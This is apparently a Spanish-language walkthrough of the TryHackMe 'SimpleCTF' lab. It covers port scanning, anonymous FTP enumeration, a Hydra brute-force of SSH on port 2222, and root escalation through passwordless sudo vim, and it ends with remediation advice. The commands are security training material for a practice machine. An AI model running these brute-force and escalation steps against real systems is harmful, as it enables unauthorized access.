# SimpleCTF - Writeup
<img width="360" height="104" alt="image" src="https://github.com/user-attachments/assets/22f89e1b-e145-4d75-b2d0-1a40ba29ae5c" />

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?logo=tryhackme)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![OS](https://img.shields.io/badge/OS-Linux-black?logo=linux)

| **Auditor** | **Fecha** | **Objetivo** |
| :--- | :--- | :--- |
| **mrbluesan** | 14/01/2026 | Evaluar la seguridad del servidor y obtener acceso Root. |

---

## 1. Resumen
Durante la auditoría de la máquina **SimpleCTF**, se logró comprometer totalmente el sistema (Privilegios Root).

El vector de ataque siguió esta secuencia:
1.  **Reconocimiento:** Detección de servicios FTP (21) y SSH (2222).
2.  **Acceso Inicial:** Explotación de una mala configuración en FTP (Anonymous) para obtener información, seguido de un ataque de fuerza bruta exitoso contra SSH.
3.  **Escalada de Privilegios:** Abuso de permisos `sudo` mal configurados en el binario `vim` (GTFOBins).

---

## 2. Fase 1: Reconocimiento y Escaneo
### 2.1 Verificación de Conectividad
Primero, se verifica que la máquina objetivo esté activa y responda a solicitudes ICMP.

```bash
ping -c 1 [IP_OBJETIVO]
```
<img width="639" height="245" alt="image" src="https://github.com/user-attachments/assets/ce2d9cce-7485-4417-a09e-71bff238500d" />

### 2.2 Escaneo inicial de puertos con Nmap
```bash
sudo nmap -p- --min-rate 5000 -n -vvv [IP_OBJETIVO] -oG escaneo_rapido.txt
```
<img width="675" height="539" alt="image" src="https://github.com/user-attachments/assets/8a1151b0-9fc5-48a2-b3f8-524405054dbd" />


### 2.3 Enumeración de FTP (Puerto 21)
Al detectar acceso anónimo, nos conectamos para inspeccionar el contenido.
```bash
ftp [IP_OBJETIVO]
```
Name: anonymous (no intentar con ftp ip -a debido a que no responde el servidor)
Password: (Enter)
Dentro del servidor, listamos los archivos y encontramos "ForMitch.txt" (posible información crítica). 
Lo descargamos a nuestra máquina local (si no carga el servidor hay que desactivar el modo pasivo con passive y voler a intentar):
```bash
ftp> ls
ftp> get ForMitch.txt
ftp> exit
```
Al salir el archivo 'forMitch.txt' estará en el directorio en que estamos posicionados antes de ingresar al servidor ftp.
```bash
cat forMitch.txt
```
Nos da información sobre un usuario existente y la baja seguridad de su pass.
<img width="1904" height="462" alt="image" src="https://github.com/user-attachments/assets/0e96952a-4c85-4614-ae04-29444f1e052e" />


## 3. Fase 2: Explotación (Acceso Inicial)
Tras analizar la información recolectada y encontrar un posible usuario (mitch), procedemos a un ataque de fuerza bruta contra el servicio SSH, el cual corre en el puerto no estándar 2222 (esto tiene truco en que se debe especificar el puerto por el cual se dirige el ataque de fuerza bruta, generalmente al realizar esto se dirige por el puerto 22.
Herramienta: Hydra Diccionario: rockyou.txt
Puedes buscar el diccionario con locate o find asi se entrega la ruta del diccionario para pasarlo como parametro a Hydra.
```bash
hydra -l mitch -P /usr/share/wordlists/rockyou.txt ssh://[IP_OBJETIVO]:2222
```
<img width="1733" height="304" alt="image" src="https://github.com/user-attachments/assets/7b679449-5066-45c6-a8ea-638e1bf18c8a" />

Cuando finalice el ataque se entrega la contraseña para realizar conexión por ssh (también especificar puerto para realizar conexión).
```bash
ssh -p 2222 mitch@[IP_OBJETIVO]
```
Encontrar flag de user.txt
```bash
ls
cat user.txt
```
<img width="788" height="414" alt="image" src="https://github.com/user-attachments/assets/d3082a34-be5e-4902-bc82-f3110b0b9b37" />


## 4. Fase 3: Escalada de Privilegios
### 4.1 Enumeración Interna
Una vez dentro del sistema, verificamos los permisos de superusuario asignados al usuario mitch.
```bash
sudo -l
```

### 4.2 Explotación (GTFOBins - Vim)
Detectamos que podemos ejecutar el editor de texto vim como root sin contraseña. Vim permite ejecutar comandos del sistema operativo desde su interfaz.
Ejecutar vim con privilegios elevados.
```bash
sudo /usr/bin/vim
```
Dentro de la interfaz de Vim, escribir el siguiente comando para invocar una shell Bash y presionamos Enter:
```bash
:!/bin/bash
```
<img width="1437" height="935" alt="image" src="https://github.com/user-attachments/assets/986de7b3-d87b-4e5e-b701-f551ca4f8b81" />

Al salir a la terminal, hemos heredado los permisos de root con que se ejecuto la instancia de vim.
Realizar locate a root.txt
```bash
locate root.txt
cat root.txt
```
<img width="480" height="172" alt="image" src="https://github.com/user-attachments/assets/cdf6ae11-0c60-4807-b412-c7c5aeba3e93" />

## 5. Reporte de Remediación
Vim permitido en sudoers sin contraseña.
Eliminar /usr/bin/vim de /etc/sudoers o usar sudoedit.Weak SSH Credentials
Contraseña de usuario presente en diccionarios.Forzar contraseñas robustas y deshabilitar login por password.
FTP Anonymous. Acceso público a archivos internos.Configurar anonymous_enable=NO en vsftpd.conf.
